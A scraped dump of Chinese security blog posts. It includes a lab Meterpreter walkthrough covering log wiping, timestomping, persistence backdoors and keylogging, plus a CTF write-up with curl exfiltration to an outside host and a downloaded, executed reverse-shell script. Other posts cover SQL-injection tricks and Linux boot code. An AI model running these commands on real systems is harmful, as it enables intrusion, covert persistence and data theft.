下面演示怎么通过注册表复制克隆用户 123456789101112131415161718192021222324252627meterpreter &gt; reg enumkey -k HKLM\\\\sam\\\\sam\\\\domains\\\\account\\\\usersEnumerating: HKLM\\sam\\sam\\domains\\account\\users Keys (3): 000001F4 000001F5 Names Values (1): meterpreter &gt; shellProcess 1884 created.Channel 1 created.Microsoft Windows [�汾 6.1.7601]��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����C:\\windows\\system32&gt;net user guest /active:yes net user guest /active:yesC:\\windows\\system32&gt;reg copy HkLM\\sam\\sam\\domains\\account\\users\\000001f4 HkLM\\sam\\sam\\domains\\account\\users\\000001f5reg copy HkLM\\sam\\sam\\domains\\account\\users\\000001f4 HkLM\\sam\\sam\\domains\\account\\users\\000001f5 sam\\sam\\domains\\account\\users\\000001f4\\F �Ѵ��ڣ�Ҫ������(Yes/No/All)? Yes\\ֵ sam\\sam\\domains\\account\\users\\000001f4\\V �Ѵ��ڣ�Ҫ������(Yes/No/All)?No �����ɹ����ɡ� 0x06端口转发1234567891011121314meterpreter &gt; portfwd delete -l 3389[*] Successfully stopped TCP relay on 0.0.0.0:3389meterpreter &gt; portfwd add -l 3389 -p 3389 -r 192.168.161.138[*] Local TCP relay created: :3389 &lt;-&gt; 192.168.161.138:3389meterpreter &gt; portfwd listActive Port Forwards==================== Index Local Remote Direction ----- ----- ------ --------- 1 0.0.0.0:3389 192.168.161.138:3389 Forward1 total active port forwards. 0x07搜索文件在awd攻防赛的时候很好用12345meterpreter &gt; search -f *flag*Found 3 results... c:\\flag.txt (39 bytes) c:\\Users\\administrator.TEST\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\flag.txt.lnk (477 bytes) c:\\Users\\Administrator.ZGC-20160413JJL\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\flag.txt.lnk (477 bytes) 0x08抓包1234567891011121314151617181920212223242526272829303132333435363738meterpreter &gt; use snifferLoading extension sniffer...Success.meterpreter &gt; helpSniffer Commands================ Command Description ------- ----------- sniffer_dump Retrieve captured packet data to PCAP file sniffer_interfaces Enumerate all sniffable network interfaces sniffer_release Free captured packets on a specific interface instead of downloading them sniffer_start Start packet capture on a specific interface sniffer_stats View statistics of an active capture sniffer_stop Stop packet capture on a specific interfacemeterpreter &gt; sniffer_interfaces1 - &apos;WAN Miniport (Network Monitor)&apos; ( type:3 mtu:1514 usable:true dhcp:false wifi:false )2 - &apos;Intel(R) PRO/1000 MT Network Connection&apos; ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )3 - &apos;Intel(R) PRO/1000 MT Network Connection&apos; ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )4 - &apos;Intel(R) PRO/1000 MT Network Connection&apos; ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false )5 - &apos;Intel(R) PRO/1000 MT Network Connection&apos; ( type:0 mtu:1514 usable:true dhcp:true wifi:false )meterpreter &gt; sniffer_start 5[*] Capture started on interface 5 (50000 packet buffer)meterpreter &gt; sniffer_dump 5 /tmp/1.pcap[*] Flushing packet capture buffer for interface 5...[*] Flushed 2540 packets (1450560 bytes)[*] Downloaded 036% (524288/1450560)...[*] Downloaded 072% (1048576/1450560)...[*] Downloaded 100% (1450560/1450560)...[*] Download completed, converting to PCAP...[*] PCAP file written to /tmp/1.pcapmeterpreter &gt; sniffer_stop 5[*] Capture stopped on interface 5[*] There are 29 packets (2263 bytes) remaining[*] Download or release them using &apos;sniffer_dump&apos; or &apos;sniffer_release&apos; 0x09开启338912345678910meterpreter &gt; run getgui -u haha -p password[!] Meterpreter scripts are deprecated. Try post/windows/manage/enable_rdp.[!] Example: run post/windows/manage/enable_rdp OPTION=value [...][*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator[*] Carlos Perez carlos_perez@darkoperator.com[*] Setting user account for logon[*] Adding User: haha with Password: password[*] For cleanup use command: run multi_console_command -r /root/.msf4/logs/scripts/getgui/clean_up__20180319.1815.rcmeterpreter &gt; run multi_console_command -r /root/.msf4/logs/scripts/getgui/clean_up__20180319.1815.rc 会新建个账号，并在后面删掉 0x0A改变文件时间123456789101112131415161718192021222324252627282930313233343536Usage: timestomp &lt;file(s)&gt; OPTIONSOPTIONS: -a &lt;opt&gt; Set the &quot;last accessed&quot; time of the file -b Set the MACE timestamps so that EnCase shows blanks -c &lt;opt&gt; Set the &quot;creation&quot; time of the file -e &lt;opt&gt; Set the &quot;mft entry modified&quot; time of the file -f &lt;opt&gt; Set the MACE of attributes equal to the supplied file -h Help banner -m &lt;opt&gt; Set the &quot;last written&quot; time of the file -r Set the MACE timestamps recursively on a directory -v Display the UTC MACE values of the file -z &lt;opt&gt; Set all four attributes (MACE) of the filemeterpreter &gt; timestomp -v flag.txt[*] Showing MACE attributes for flag.txtModified : 2017-02-22 14:55:50 +0800Accessed : 2017-01-11 20:53:57 +0800Created : 2017-01-11 20:53:57 +0800Entry Modified: 2017-02-22 14:55:50 +0800meterpreter &gt; timestomp -v 1.txt[*] Showing MACE attributes for 1.txtModified : 2018-03-19 20:13:36 +0800Accessed : 2018-03-19 21:41:24 +0800Created : 2018-03-19 21:41:24 +0800Entry Modified: 2018-03-19 21:41:24 +0800meterpreter &gt; timestomp 1.txt -f flag.txt[*] Pulling MACE attributes from flag.txt[*] Setting specific MACE attributes on 1.txtmeterpreter &gt; timestomp -v 1.txt[*] Showing MACE attributes for 1.txtModified : 2017-02-22 14:55:50 +0800Accessed : 2017-01-11 20:53:57 +0800Created : 2017-01-11 20:53:57 +0800Entry Modified: 2017-02-22 14:55:50 +0800 0x0B日志清除1234meterpreter &gt; clearev [*] Wiping 1692 records from Application...[*] Wiping 6855 records from System...[*] Wiping 2664 records from Security... 0X0C留后门 Metsvc(通过服务安装) 12345678910111213meterpreter &gt; run metsvc [!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.[!] Example: run post/windows/manage/persistence_exe OPTION=value [...][*] Creating a meterpreter service on port 31337[*] Creating a temporary installation directory C:\\Users\\ADMINI~1.TES\\AppData\\Local\\Temp\\ENDPAzIy...[*] &gt;&gt; Uploading metsrv.x86.dll...[*] &gt;&gt; Uploading metsvc-server.exe...[*] &gt;&gt; Uploading metsvc.exe...[*] Starting the service... * Installing service metsvc * Starting serviceService metsvc successfully installed. 这个时候我们去连接它 1234567891011msf exploit(multi/handler) &gt; set payload windows/metsvc_bind_tcppayload =&gt; windows/metsvc_bind_tcpmsf exploit(multi/handler) &gt; set rhost 192.168.161.132rhost =&gt; 192.168.161.132msf exploit(multi/handler) &gt; set lport 31337lport =&gt; 31337msf exploit(multi/handler) &gt; exploit[*] Started bind handler[*] 192.168.161.132 - Meterpreter session 6 closed. Reason: Died[*] Meterpreter session 6 opened (127.0.0.1 -&gt; 127.0.0.1) at 2018-03-19 21:37:23 +0800 persistence(通过自启动安装) 12345678910111213meterpreter &gt; run persistence -U -i 5 -p 443 -r 192.168.161.138[!] Meterpreter scripts are deprecated. Try post/windows/manage/persistence_exe.[!] Example: run post/windows/manage/persistence_exe OPTION=value [...][*] Running Persistence Script[*] Resource file for cleanup created at /root/.msf4/logs/persistence/TOPSEC_20180319.1312/TOPSEC_20180319.1312.rc[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.161.138 LPORT=443[*] Persistent agent script is 99606 bytes long[+] Persistent Script written to C:\\Users\\ADMINI~1.TES\\AppData\\Local\\Temp\\xdoxmsHr.vbs[*] Executing script C:\\Users\\ADMINI~1.TES\\AppData\\Local\\Temp\\xdoxmsHr.vbs[+] Agent executed with PID 3528[*] Installing into autorun as HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\jQiyGnPRxgnllmr[+] Installed into autorun as HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\jQiyGnPRxgnllmr 然后重启试下123456789101112131415161718meterpreter &gt; [*] 192.168.161.132 - Meterpreter session 4 closed. Reason: Diedmsf exploit(multi/handler) &gt; [*] Sending stage (179779 bytes) to 192.168.161.132[*] Meterpreter session 5 opened (192.168.161.138:443 -&gt; 192.168.161.132:49169) at 2018-03-19 21:18:07 +0800msf exploit(multi/handler) &gt; sessions -lActive sessions=============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 5 meterpreter x86/windows TEST\\Administrator @ TOPSEC 192.168.161.138:443 -&gt; 192.168.161.132:49169 (192.168.161.132)msf exploit(multi/handler) &gt; sessions -i 5[*] Starting interaction with 5...meterpreter &gt; 会留一个后门，并添加进启动项 0X0D键盘记录12345678meterpreter &gt; keyscan_startStarting the keystroke sniffer ...meterpreter &gt; keyscan_dump Dumping captured keystrokes...mima&lt;Shift&gt;&lt;Right Shift&gt;:12345679&lt;^S&gt;meterpreter &gt; keyscan_stopStopping the keystroke sniffer... 0X0E进程注入1234567891011121314151617181920meterpreter &gt; psProcess List============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 0 0 [System Process] 4 0 System x86 0 232 4 smss.exe x86 0 NT AUTHORITY\\SYSTEM \\SystemRoot\\System32\\smss.exe 320 312 csrss.exe x86 0 NT AUTHORITY\\SYSTEM C:\\windows\\system32\\csrss.exe 368 480 msdtc.exe x86 0 NT AUTHORITY\\NETWORK SERVICE C:\\windows\\System32\\msdtc.exe 372 312 wininit.exe x86 0 NT AUTHORITY\\SYSTEM C:\\windows\\system32\\wininit.exe 384 364 csrss.exe x86 1 NT AUTHORITY\\SYSTEM C:\\windows\\system32\\csrss.exe 432 364 winlogon.exe x86 1 NT AUTHORITY\\SYSTEM C:\\windows\\system32\\winlogon.exe 480 372 services.exe x86 0 NT AUTHORITY\\SYSTEM C:\\windows\\system32\\services.exe 488 372 lsass.exe x86 0 NT AUTHORITY\\SYSTEM C:\\windows\\system32\\lsass.exe...meterpreter &gt; migrate 3104[*] Migrating to 3104 0x0F 截屏123456eterpreter &gt; use espiaLoading extension espia...Success.meterpreter &gt; screenscreengrab screenshot meterpreter &gt; screengrab Screenshot saved to: /home/daiker/zQBKZbTv.jpeg","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://www.daikersec.com/categories/渗透测试/"},{"name":"工具使用","slug":"渗透测试/工具使用","permalink":"http://www.daikersec.com/categories/渗透测试/工具使用/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.daikersec.com/tags/Linux/"},{"name":"Kali","slug":"Kali","permalink":"http://www.daikersec.com/tags/Kali/"},{"name":"tools","slug":"tools","permalink":"http://www.daikersec.com/tags/tools/"}]},{"title":"Linuxv0.11源码分析之引导启动程序一","slug":"Linuxv0.11源码分析之引导启动程序一","date":"2018-03-19T05:16:28.000Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"wiki/b309a0f3.html","link":"","permalink":"http://www.daikersec.com/wiki/b309a0f3.html","excerpt":"0x00 大体流程这篇文章所分析的代码是从开机到bios启动，到bios引导载入第一个引导扇区(bootsect.s)，到2到5个引导扇区(setup.s),到载入后面的240个扇区(head.s)的内容，最后将程序的控制权交给setup.s","text":"0x00 大体流程这篇文章所分析的代码是从开机到bios启动，到bios引导载入第一个引导扇区(bootsect.s)，到2到5个引导扇区(setup.s),到载入后面的240个扇区(head.s)的内容，最后将程序的控制权交给setup.s 0x01 bios做了什么按下电源键的时候，CPU硬件逻辑设计为强行将CS的值置为0F000,IP的值置为0xFFF0,这样CS：IP就指向0xFFFF0这个地址位置。而bios的入口地址就设计在这个位置。这个时候bios开始运行。bios会读取并检测显卡，内存等电脑硬件。接下来bios会在内存中加载向量表和终端服务程序。此时内存的信息如下12340x00000-0x003FF 中断向量表(1kb)0x00400-0x004FF BIOS数据区(256b)....57kb以后-xxxx(8kb)的终端服务程序 接下来bios会触发0x19中断这个中断对应的中断服务程序的功能是将0号磁头对应盘面的0磁道1扇区的内容(共512个字节，就叫做”主引导记录”（Master boot record，缩写为MBR）)复制至内存0x07C00处 0x02 将随后的4个扇区加载进内存从入口开始看boot/bootsect.s1234567891011entry _start_start: mov ax,#BOOTSEG mov ds,ax mov ax,#INITSEG mov es,ax mov cx,#256 sub si,si sub di,di rep movw !bootsec 这段代码是含义是将BOOTSEG后面512个字节移到INITSEG后面的512个字节然后看下BOOTSEG和INITSEG的定义12BOOTSEG = 0x07c0 ! 启动扇区被BIOS加载的位置INITSEG = 0x9000 ! 启动扇区将移动到的新位置 也就是说我们在前一步通过bios加载进内存的512字节，一开始会先把自己512字节内容由0x07c00复制到0x90000处接下来1jmpi go,INITSEG !跳转到0x90000处继续执行 这里jmpi的格式是jmpi ip,cs。如果没有这一步，程序接下来会执行0x07C00为开始的那一段的go处。但是这里跳转到0x90000开始的那一段内存的go处。跳转到复制完的地方执行。接下来继续看123456go: mov ax,cs mov ds,ax mov es,ax ! put stack at 0x9ff00. mov ss,ax mov sp,#0xFF00 ! arbitrary value &gt;&gt;512 前面已经改变了cs，现在对ds，es，sp的值进行设置继续看123456load_setup: mov dx,#0x0000 ! drive 0, head 0 mov cx,#0x0002 ! sector 2, track 0 mov bx,#0x0200 ! address = 512, in INITSEG mov ax,#0x0200+SETUPLEN ! service 2, nr of sectors int 0x13 ! read it 首先查下bios的0x13中断是什么意思对应表格查阅，可以看出这几行代码的意思是把从第二个扇区开始的4个扇区(即setup.s，在boot/setup.s里面)读进内存es:bx处，即0x90200处。前面说到第一个扇区的内存被复制到0x90000处，0x90200离0x90000有256字节，刚好是第一个扇区的长度。也就是说第一个扇区和第二个扇区相邻。 12345jnc ok_load_setup ! ok - continue mov dx,#0x0000 mov ax,#0x0000 ! reset the diskette int 0x13 j load_setup 这段代码是判断是否成功，没有成功的话，系统复位之后再重新读一次。 0x03 将后面的240个扇区加载进内存接下来我们将第三批程序载入内存从105行开始1234567! ok, we&apos;ve written the message, now! we want to load the system (at 0x10000) mov ax,#SYSSEG mov es,ax ! segment of 0x010000 call read_it call kill_motor 这段代码的功能和载入setup.s一样，，只不过载入setup.s只有四个扇区，这段代码足足占了240个扇区。花的时间比较长，为了防止用户以为机器故障，linus加了一个输出 123456789mov ah,#0x03 ! read cursor posxor bh,bhint 0x10mov cx,#24mov bx,#0x0007 ! page 0, attribute 7 (normal)mov bp,#msg1mov ax,#0x1301 ! write string, move cursorint 0x10 调用0x10中断输出Loading system ...看下0x10中断的内容 下面我们来具体看下这240个扇区怎么载入的 我们先看下read_it子模块 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576read_it: mov ax,es test ax,#0x0fffdie: jne die ! 确保es必须是64kb xor bx,bx !清空bx,使得bs可以被用作段内基址rp_read: mov ax,es cmp ax,#ENDSEG ! have we loaded all yet? jb ok1_read retok1_read: seg cs mov ax,sectors sub ax,sread mov cx,ax shl cx,#9 add cx,bx jnc ok2_read je ok2_read xor ax,ax sub ax,bx shr ax,#9ok2_read: call read_track mov cx,ax add ax,sread seg cs cmp ax,sectors jne ok3_read mov ax,#1 sub ax,head jne ok4_read inc trackok4_read: mov head,ax xor ax,axok3_read: mov sread,ax shl cx,#9 add bx,cx jnc rp_read mov ax,es add ax,#0x1000 mov es,ax xor bx,bx jmp rp_readread_track: push ax push bx push cx push dx mov dx,track mov cx,sread inc cx mov ch,dl mov dx,head mov dh,dl mov dl,#0 and dx,#0x0100 mov ah,#2 int 0x13 jc bad_rt pop dx pop cx pop bx pop ax retbad_rt: mov ax,#0 mov dx,#0 int 0x13 pop dx pop cx pop bx pop ax jmp read_track 接下来看kill_motor子模块 1234567kill_motor: push dx mov dx,#0x3f2 mov al,#0 outb pop dx ret 0x04 确认下根设备号0x05 将程序控制权转交给setup.s1SETUPSEG = 0x9020 12345! after that (everyting loaded), we jump to! the setup-routine loaded directly after! the bootblock: jmpi 0,SETUPSEG 前面说到0x13中断将第二个扇区到第五个扇区的内容(即setup.s的内容)加载到以0x90200处地址，现在跳转到那边，把控制权交给他","categories":[{"name":"Linux","slug":"Linux","permalink":"http://www.daikersec.com/categories/Linux/"},{"name":"内核","slug":"Linux/内核","permalink":"http://www.daikersec.com/categories/Linux/内核/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.daikersec.com/tags/Linux/"},{"name":"内核","slug":"内核","permalink":"http://www.daikersec.com/tags/内核/"}]},{"title":"PWN环境搭建","slug":"PWN环境搭建","date":"2018-03-18T07:02:16.000Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"wiki/11af4bf6.html","link":"","permalink":"http://www.daikersec.com/wiki/11af4bf6.html","excerpt":"0x00 关闭安全机制1.关掉DEP/NX（堆栈不可执行）1gcc -z execstack -o pwnme pwnme.c 2.关掉Stack Protector/Canary（栈保护）1gcc -fno-stack-protector -o pwnme pwnme.c","text":"0x00 关闭安全机制1.关掉DEP/NX（堆栈不可执行）1gcc -z execstack -o pwnme pwnme.c 2.关掉Stack Protector/Canary（栈保护）1gcc -fno-stack-protector -o pwnme pwnme.c 3.关掉程序ASLR/PIE（程序随机化保护）1gcc -no-pie -o pwnme pwnme.c 4.关闭整个linux系统的ASLR保护123su - echo 0 &gt; /proc/sys/kernel/randomize_va_spaceexit 5.打开整个linux系统的ASLR保护123su -echo 2 &gt; /proc/sys/kernel/randomize_va_spaceexit 64位linux下面的GCC编译出一个32位可执行程序 加参数- m321gcc -m32 -z execstack -fno-stack-protector -o pwnme pwnme.c 另外说明下在ubuntu上如果要用 -m32 参数就要安装如下的库：12$ sudo apt-get install build-essential module-assistant $ sudo apt-get install gcc-multilib g++-multilib 0x01 安装pwntools1pip install pwntools 0x02 安装peda12git clone https://github.com/longld/peda.git ~/pedaecho \"source ~/peda/peda.py\" &gt;&gt; ~/.gdbinit 0x03 绑定端口1socat tcp-l:端口号，reuseaddr，fork exec:程序位置","categories":[{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"http://www.daikersec.com/categories/漏洞挖掘/"},{"name":"二进制漏洞","slug":"漏洞挖掘/二进制漏洞","permalink":"http://www.daikersec.com/categories/漏洞挖掘/二进制漏洞/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://www.daikersec.com/tags/pwn/"}]},{"title":"解决msf内存不足不能启动的问题","slug":"解决msf内存不足不能启动的问题","date":"2018-03-15T06:50:54.000Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"wiki/376537a6.html","link":"","permalink":"http://www.daikersec.com/wiki/376537a6.html","excerpt":"0x00 问题在vps里面跑msf，经常遇到内存不足，提示如下","text":"0x00 问题在vps里面跑msf，经常遇到内存不足，提示如下12345678910111213/opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/activesupport-4.2.10/lib/active_support/core_ext/kernel/agnostics.rb:7:in ``&apos;: Cannot allocate memory - infocmp (Errno::ENOMEM) from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/activesupport-4.2.10/lib/active_support/core_ext/kernel/agnostics.rb:7:in ``&apos; from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:1815:in `get_term_capabilities&apos; from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:2027:in `_rl_init_terminal_io&apos; from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:2564:in `readline_initialize_everything&apos; from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:3849:in `rl_initialize&apos; from /opt/metasploit-framework/embedded/lib/ruby/gems/2.4.0/gems/rb-readline-0.5.5/lib/rbreadline.rb:4868:in `readline&apos; from /opt/metasploit-framework/embedded/framework/lib/rex/ui/text/input/readline.rb:162:in `readline_with_output&apos; from /opt/metasploit-framework/embedded/framework/lib/rex/ui/text/input/readline.rb:100:in `pgets&apos; from /opt/metasploit-framework/embedded/framework/lib/rex/ui/text/shell.rb:375:in `get_input_line&apos; from /opt/metasploit-framework/embedded/framework/lib/rex/ui/text/shell.rb:191:in `run&apos; from /opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/console.rb:48:in `start&apos; from /opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/base.rb:82:in `start&apos; 内存不足，一直没有好的解决方案。最近看Linux的时候，看到Swap分区，想到一个解决方案 0x01 解决方案vps默认安装的时候是没有安装swap分区的123456[root@daiker ~]# toptop - 06:35:36 up 14:57, 2 users, load average: 0.21, 0.09, 0.07Tasks: 86 total, 1 running, 85 sleeping, 0 stopped, 0 zombie%Cpu(s): 0.5 us, 0.0 sy, 0.0 ni, 99.5 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 stKiB Mem : 1016108 total, 240924 free, 518952 used, 256232 buff/cacheKiB Swap: 0 total, 0 free, 0 used. 247996 avail Mem 我们可以给分配一个swap分区,命令如下 123dd if=/dev/zero of=/home/swap bs=1024 count=512000/sbin/mkswap /home/swap/sbin/swapon /home/swap 然后查看swap分区1234[root@daiker ~]# free -h total used free shared buff/cache availableMem: 992M 506M 74M 92M 411M 242MSwap: 499M 0B 499M msf成功开启","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://www.daikersec.com/categories/渗透测试/"},{"name":"工具使用","slug":"渗透测试/工具使用","permalink":"http://www.daikersec.com/categories/渗透测试/工具使用/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.daikersec.com/tags/Linux/"},{"name":"Kali","slug":"Kali","permalink":"http://www.daikersec.com/tags/Kali/"},{"name":"tools","slug":"tools","permalink":"http://www.daikersec.com/tags/tools/"}]},{"title":"CTF中SQL注入字段名被过滤小技巧","slug":"CTF中SQL注入字段名被过滤小技巧","date":"2018-03-12T03:04:07.000Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"wiki/a62e54a0.html","link":"","permalink":"http://www.daikersec.com/wiki/a62e54a0.html","excerpt":"0x00 前言CTF中SQL注入字段名被过滤小技巧，后续有学习到啥好方法再加进来 0x01 问题引入1234567mysql&gt; select * from users;+--------+-----------+| points | flag |+--------+-----------+| 31 | daiker666 |+--------+-----------+1 row in set (0.00 sec) 然后我们已经知道表名users，要查询flag的值，但是flag被过滤了。","text":"0x00 前言CTF中SQL注入字段名被过滤小技巧，后续有学习到啥好方法再加进来 0x01 问题引入1234567mysql&gt; select * from users;+--------+-----------+| points | flag |+--------+-----------+| 31 | daiker666 |+--------+-----------+1 row in set (0.00 sec) 然后我们已经知道表名users，要查询flag的值，但是flag被过滤了。 0x02 问题思考常规的查询是select flag from users,如果我要在们的查询语句中不见到flag，就得把flag这个列设置别名，mysql设置列别名有两种方法。123456789101112131415mysql&gt; select flag as haha from users;+-----------+| haha |+-----------+| daiker666 |+-----------+1 row in set (0.00 sec)mysql&gt; select (flag)haha from users;+-----------+| haha |+-----------+| daiker666 |+-----------+1 row in set (0.00 sec) 但是这样我们还会出现flag这个字段。这时候想到这个123456789101112131415mysql&gt; select 1;+---+| 1 |+---+| 1 |+---+1 row in set (0.00 sec)mysql&gt; select 1,2;+---+---+| 1 | 2 |+---+---+| 1 | 2 |+---+---+1 row in set (0.00 sec) 这样列名不久变成我们想要的结果，然而我们想要的结果是users表的内容，我们可以使用联合查询12345678mysql&gt; select 1,2 union select * from users;+------+-----------+| 1 | 2 |+------+-----------+| 1 | 2 || 31 | daiker666 |+------+-----------+2 rows in set (0.01 sec) 这样我们想要的值就在表里面，，下面思考下怎么提取出来，查询的结果是一张虚表，我们可以用设置别名的方法给这张表命名12345678mysql&gt; select * from (select 1,2 union select * from users)c;+------+-----------+| 1 | 2 |+------+-----------+| 1 | 2 || 31 | daiker666 |+------+-----------+2 rows in set (0.02 sec) 然后提取flag1234567mysql&gt; select c.2 from (select 1,2 union select * from users)c limit 1,2;+-----------+| 2 |+-----------+| daiker666 |+-----------+1 row in set (0.02 sec)","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://www.daikersec.com/categories/渗透测试/"},{"name":"Web安全","slug":"渗透测试/Web安全","permalink":"http://www.daikersec.com/categories/渗透测试/Web安全/"},{"name":"SQL注入","slug":"渗透测试/Web安全/SQL注入","permalink":"http://www.daikersec.com/categories/渗透测试/Web安全/SQL注入/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://www.daikersec.com/tags/CTF/"},{"name":"注入","slug":"注入","permalink":"http://www.daikersec.com/tags/注入/"},{"name":"web","slug":"web","permalink":"http://www.daikersec.com/tags/web/"}]},{"title":"happyMoctf-ping一下好吗WP","slug":"happyMoctf-ping一下好吗WP","date":"2018-02-15T10:39:15.000Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"wiki/8f0228b2.html","link":"","permalink":"http://www.daikersec.com/wiki/8f0228b2.html","excerpt":"0x00 前言这道题着重点在于没有回显的命令执行，waf也侧重在于防止反弹shell，一般的命令没有过滤。对于没有回显的命令执行一般可以通过DNS通道/HTTP通道和反弹shell。 0x01 DNS通道/HTTP通道post ip=0.0.0.0|curl ***.ceye.io/`whoami`，在ceye那个网站可以看到有返回消息(Linux在命令参数执行命令的有`` 和$()两种，这里()被过滤)","text":"0x00 前言这道题着重点在于没有回显的命令执行，waf也侧重在于防止反弹shell，一般的命令没有过滤。对于没有回显的命令执行一般可以通过DNS通道/HTTP通道和反弹shell。 0x01 DNS通道/HTTP通道post ip=0.0.0.0|curl ***.ceye.io/`whoami`，在ceye那个网站可以看到有返回消息(Linux在命令参数执行命令的有`` 和$()两种，这里()被过滤)执行ls|base64(要经过base64编码是因为有一些不可打印字符和空格)解码后可以看到。然后cat就可以读flag。这里面出了个小差错，&lt;?php后面忘记加空格，导致直接访问查看源码可以直接看到flag。说个好玩的，我13号早上把flag文件名的名字改了，然后晚上查看日志的时候居然发现几个ip在直接访问旧的flag文件名。dns类似，直接post `command`.xx.ceye.io就可以 0x02 反弹shell由于直接反弹shell的命令几乎都会触发waf，所以可以先把执行shell的命令保存到本地，再执行。这里面不存在wget，只能利用curl。-被禁了，不能通过-o来保存到文件，可以通过&gt;。写到/tmp底下执行post ip=0.0.0.0|curl 139.199.2.226:6666/1 &gt;/tmp/1然后本机监听8080端口 post ip=0.0.0.0|/chmod +x tmp/1添加执行权限post ip=0.0.0.0|/tmp/1反弹成功","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://www.daikersec.com/categories/渗透测试/"},{"name":"Web安全","slug":"渗透测试/Web安全","permalink":"http://www.daikersec.com/categories/渗透测试/Web安全/"},{"name":"命令执行","slug":"渗透测试/Web安全/命令执行","permalink":"http://www.daikersec.com/categories/渗透测试/Web安全/命令执行/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://www.daikersec.com/tags/ctf/"},{"name":"Web","slug":"Web","permalink":"http://www.daikersec.com/tags/Web/"},{"name":"漏洞研究","slug":"漏洞研究","permalink":"http://www.daikersec.com/tags/漏洞研究/"}]},{"title":"php反序列化漏洞","slug":"php反序列化漏洞","date":"2017-12-22T12:47:40.000Z","updated":"2018-05-21T03:03:47.000Z","comments":true,"path":"wiki/39a24cc2.html","link":"","permalink":"http://www.daikersec.com/wiki/39a24cc2.html","excerpt":"0x00 序列化所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。 所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。","text":"0x00 序列化所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。 所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。 序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。序列化的例子123456789101112131415161718192021222324&lt;?php/** * * @authors daiker (daikersec@gmail.com) * @date 2017-12-22 15:39:43 * @version $Id$ */error_reporting(E_ALL);$var_int = 1;$var_str = \"123\";$var_float = 1.2;$var_bool = true;$var_arr = array('1' =&gt; 1,1.2,false );class ClassName &#123; var $var_name = 1; function myfunction()&#123; return \"1\"; &#125;&#125; $arrayName = array($var_int,$var_str,$var_float,$var_bool,$var_arr,new ClassName ()); foreach ($arrayName as $key =&gt; $value) &#123; echo serialize($value).\"&lt;br/&gt;\"; &#125; 结果是123456i:1;s:3:\"123\";d:1.2;b:1;a:3:&#123;i:1;i:1;i:2;d:1.2;i:3;b:0;&#125;O:9:\"ClassName\":1:&#123;s:8:\"var_name\";i:1;&#125; 从例子中我们可以看到，变量，数组，对象可以被序列化。变量的值会被保存下来。以:隔开，类名会被保存下来，类变量，类变量名和类变量值会被保存下来，类方法不会被保存起来。 0x01 反序列化反序列化就是将序列化后的字符串转化回数组和对象看例子1234567891011121314&lt;?php/** * * @authors daiker (daikersec@gmail.com) * @date 2017-12-22 16:02:17 * @version $Id$ */$un_arr_str = 'a:3:&#123;i:1;i:1;i:2;d:1.2;i:3;b:0;&#125;';//$var_arr = array('1' =&gt; 1,1.2,false );$un_class_str = 'O:9:\"ClassName\":1:&#123;s:8:\"var_name\";i:1;&#125;';var_dump(unserialize($un_arr_str));$O = unserialize($un_class_str);// var_dump($O);var_dump($O-&gt;var_name); 这里的结果是12array(3) &#123; [1]=&gt; int(1) [2]=&gt; float(1.2) [3]=&gt; bool(false) &#125; NULL 比较奇怪的是为什么第二个会是NULL。因为将对象序列化之后，只是保存它的关键数据，对于这个类的具体内容一无所知。所以反序列回一个对象的时候，需要反序列的上下文中存在模板(这里就是类的定义)。 0x02 魔术函数PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。下面举一个例子。12345678class 